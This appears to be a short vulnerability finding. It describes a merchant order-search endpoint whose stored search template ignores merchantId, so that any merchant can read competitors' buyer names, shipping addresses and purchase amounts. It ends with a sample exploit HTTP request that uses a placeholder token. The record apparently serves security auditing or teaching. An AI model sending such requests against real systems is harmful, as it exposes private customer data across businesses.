diagnosis: The merchant order lookup endpoint executes a stored search template passing only the trackingRef parameter. Although the caller is authenticated as a merchant, the search template does not require or filter on merchantId. Any merchant can track and view buyer names, shipping addresses, and purchase amounts belonging to competitor merchants.
exploit_request:
POST /api/merchant/orders/search-by-ref HTTP/1.1
Host: orders.marketplacehub.io
Authorization: Bearer <merchant_jwt>
Content-Type: application/json

{"trackingRef": "TRK-FEDEX-991827364"}
